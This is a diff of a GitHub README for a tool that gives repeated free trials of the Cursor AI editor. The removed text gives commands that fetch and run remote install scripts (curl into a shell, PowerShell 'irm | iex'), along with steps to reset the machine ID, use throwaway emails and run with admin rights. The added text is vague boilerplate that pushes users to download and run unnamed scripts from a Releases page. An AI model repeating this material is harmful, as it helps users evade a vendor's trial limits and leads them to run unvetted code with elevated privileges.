@@ -1,131 +1,118 @@
-<h1 id="title">Use Cursor AI for free</h1>
+# Cursor AI Free: Unlock Unlimited Trials 🚀
 
-<!-- Badges -->
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License"></a>
-  <img src="https://img.shields.io/badge/Platform-Windows%7CmacOS%7CLinux-blue" alt="Platform Support">
-  <a href="https://github.com/abuhuraira-73/cursor-free-vip/stargazers"><img src="https://img.shields.io/github/stars/abuhuraira-73/cursor-free-vip?style=social" alt="GitHub stars"></a>
-  <a href="https://github.com/abuhuraira-73/cursor-free-vip/network/members"><img src="https://img.shields.io/github/forks/abuhuraira-73/cursor-free-vip?style=social" alt="GitHub forks"></a>
-</p>
+Welcome to the **Cursor AI Free** repository! This project provides scripts and tools to help you unlock unlimited trials of Cursor AI on any platform. Whether you're on Windows, macOS, or Linux, our resources will enable you to reset Cursor AI’s configuration, start fresh trial sessions, and keep your editor running free. Perfect for learning, testing, and enhancing your development productivity!
 
-<!-- Table of Contents -->
-<details>
-<summary>📑 <strong>Table of Contents</strong></summary>
+## Table of Contents
 
-- [✨ Tool Features](#✨-tool-features)
-- [💻 System Support](#💻-system-support--系統支持)
-- [👀 How to use](#👀-how-to-use)
-- [❗ Note](#❗-note)
-- [🧑‍💻 Author of this Repo](#🧑‍💻-author-of-this-repo)
-- [🤝 Contribute or Help Me](#🤝-contribute-or-help-me)
-- [📲 Scan to Support](#📲-scan-to-support)
-- [📬 Connect With Me](#📬-connect-with-me)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
+- [Contact](#contact)
 
-</details>
+## Features
 
-<p><img src="https://res.cloudinary.com/dcd51y8m1/image/upload/v1747845613/Screenshot_2025-05-21_at_10.09.18_PM_pmj9jm.png" alt="project-image"></p>
+- **Unlimited Trials**: Bypass trial limitations and access all features of Cursor AI.
+- **Cross-Platform Support**: Works seamlessly on Windows, macOS, and Linux.
+- **Easy Setup**: Simple scripts to reset configurations and start fresh sessions.
+- **Boost Productivity**: Ideal for developers looking to maximize their workflow.
+- **Open Source**: Contribute and improve the project with the community.
 
-<div>
-<p>
-  <img src="https://res.cloudinary.com/dcd51y8m1/image/upload/v1747845782/logo_em2fux.png" alt="Cursor Pro Logo" width="200" style="border-radius: 6px;"/>
-</p>
+## Installation
 
-<p><strong>Cursor</strong> is AI-powered code editor designed to enhance developer productivity by integrating advanced AI features directly into the coding environment. Here below is the instructions for using this free 150 trials with as many accounts. I used Cursor free VIP tool. This tool is for educational purposes, currently the repo does not violate any laws. Please support the original project. This tool will not generate any fake email accounts and OAuth access. Supports Windows, macOS and Linux. For optimal performance, run with privileges and always stay up to date.</p>
+To get started, visit the [Releases](https://github.com/thirteen-1/Cursor-Ai-Free/releases) section to download the necessary files. Once downloaded, execute the scripts according to the instructions provided in the respective files.
 
-<h2>✨ Tool Features</h2>
+### Step-by-Step Installation
 
-*   🔐 Support Windows macOS and Linux systems
-*   ☁️ Reset Cursor's configuration
-*   ⚡ Multi-language support (English, 简体中文, 繁體中文, Vietnamese)
+1. **Download**: Go to the [Releases](https://github.com/thirteen-1/Cursor-Ai-Free/releases) page.
+2. **Choose Your Platform**: Select the appropriate version for your operating system.
+3. **Extract Files**: Unzip the downloaded file to your preferred directory.
+4. **Run Scripts**: Follow the instructions in the README file included in the download.
 
-## 💻 System Support | 系統支持
+## Usage
 
-| Operating System | Architecture      | Supported |
-|------------------|-------------------|-----------|
-| Windows          | x64, x86          | ✅         |
-| macOS            | Intel, Apple Silicon | ✅      |
-| Linux            | x64, x86, ARM64   | ✅         |
+After installation, you can start using the scripts to unlock Cursor AI trials. Here’s how to do it:
 
-## 👀 How to use
+1. **Open Terminal or Command Prompt**: Depending on your operating system, open the command line interface.
+2. **Navigate to the Script Directory**: Use the `cd` command to change to the directory where you extracted the files.
+3. **Run the Script**: Execute the script by typing `./script_name` (replace `script_name` with the actual script name).
 
-<details open>
-<summary><b>⭐ Auto Run Script</b></summary>
+### Example Command
 
-### **Linux/macOS**
+For example, if you are using a script called `reset_cursor_ai.sh`, you would type:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
+./reset_cursor_ai.sh
 ```
 
-### **Archlinux**
+### Troubleshooting
 
-Install via [AUR](https://aur.archlinux.org/packages/cursor-free-vip-git)
+If you encounter issues, ensure that you have the necessary permissions to execute the scripts. You can change the permissions using:
 
 ```bash
-yay -S cursor-free-vip-git
+chmod +x script_name
 ```
 
-### **Windows**
+## Contributing
 
-```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.ps1 | iex
-```
+We welcome contributions from everyone! If you have ideas for improvements or new features, feel free to fork the repository and submit a pull request. Here’s how you can contribute:
 
-</details>
+1. **Fork the Repository**: Click the fork button at the top right corner.
+2. **Clone Your Fork**: Use `git clone` to clone your forked repository to your local machine.
+3. **Create a New Branch**: Use `git checkout -b feature-branch-name` to create a new branch.
+4. **Make Changes**: Implement your changes and commit them.
+5. **Push Changes**: Push your changes to your forked repository.
+6. **Create a Pull Request**: Go to the original repository and submit a pull request.
 
-* If you want to stop the script, please press Ctrl+C<br>
-* First reset the Machine ID. <br>
-* Then another accound With genertated temporary email Address. <br>
-* Don't give the OTP in the cursor webite. Instead give the OTP to terminal. It will autofill. <br>
-* To know how to get unlimited temporary Email address Use the "Temp Mail "website or the app. <br>
-* Thank me later ;) <br>
+### Guidelines
 
-## ❗ Note 
+- Ensure your code is clean and well-documented.
+- Write clear commit messages.
+- Test your changes before submitting.
 
-📝 Config 
-`Win / Macos / Linux Path | 路徑 [Documents/.cursor-free-vip/config.ini]`
-<details>
-<summary><b>⭐ Config </b></summary>
-</details>
+## License
 
-* Use administrator privileges to run the script <br>
+This project is licensed under the MIT License. Feel free to use, modify, and distribute it as you wish.
 
-* Confirm that Cursor is closed before running the script <br>
+## Support
 
-* This tool is only for learning and research purposes <br>
+If you have questions or need help, check the [Issues](https://github.com/thirteen-1/Cursor-Ai-Free/issues) section of the repository. You can also open a new issue if you encounter a bug or have a feature request.
 
-* Please comply with the relevant software usage terms when using this tool <br>
+## Contact
 
-<h2>🧑‍💻 Author of this Repo</h2>
+For further inquiries, you can reach out to the project maintainers through GitHub. We appreciate your interest and support!
 
-<p><strong>Abu Huraira</strong><br>Final Year BCA Student | MERN Stack Developer<br>Techno Main Salt Lake<br><a href="https://github.com/abuhuraira-73" target="_blank">GitHub Profile</a></p>
+---
 
-<h2>🤝 Contribute or Help Me</h2>
+## Additional Resources
 
-<p>
-  If you liked this project, consider supporting me!<br />
-  You can contribute, fork the repo, or just say hi on socials 💬
-</p>
+Here are some helpful links and resources related to Cursor AI and development productivity:
 
-<br />
+- [Cursor AI Official Site](https://www.cursorai.com)
+- [Developer Tools](https://www.developer-tools.com)
+- [Open Source Community](https://www.opensource.org)
 
-<h3>📲 Scan to Support</h3>
-<p>Scan the QR code below to support me or buy me a coffee ☕</p>
+## Community
 
-<img src="https://res.cloudinary.com/dcd51y8m1/image/upload/v1744703816/photo_6336747100607464490_x_wosmmt.jpg" alt="Support Me QR" width="180" height="180" />
+Join our community of developers who are passionate about productivity and open-source tools. Share your experiences, ask questions, and learn from others.
 
-<br /><br />
+- [Discord Server](https://discord.gg/example)
+- [Twitter](https://twitter.com/example)
 
-<h3>📬 Connect With Me</h3>
+## Acknowledgments
 
-<a href="https://github.com/abuhuraira-73" target="_blank">
-  <img src="https://img.shields.io/badge/GitHub-000?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Badge" />
-</a>
+We would like to thank the contributors and developers who made this project possible. Your efforts help improve the tools we use every day.
 
-<a href="https://x.com/Abuhuraira0703" target="_blank">
-  <img src="https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white" alt="Twitter Badge" />
-</a>
+## Final Note
 
-<a href="https://www.linkedin.com/in/abuhurairajamal/" target="_blank">
-  <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn Badge" />
-</a>
+Thank you for checking out the **Cursor AI Free** repository! We hope you find these tools helpful in your development journey. Don't forget to visit the [Releases](https://github.com/thirteen-1/Cursor-Ai-Free/releases) section for the latest updates and downloads.
+
+---
+
+![Cursor AI](https://img.shields.io/badge/Cursor-AI-Free-blue.svg)
+![GitHub](https://img.shields.io/badge/GitHub-Cursor--AI--Free-lightgrey.svg)
+![Open Source](https://img.shields.io/badge/Open%20Source-Yes-brightgreen.svg)
+
+Let’s keep coding and enhancing our productivity together!
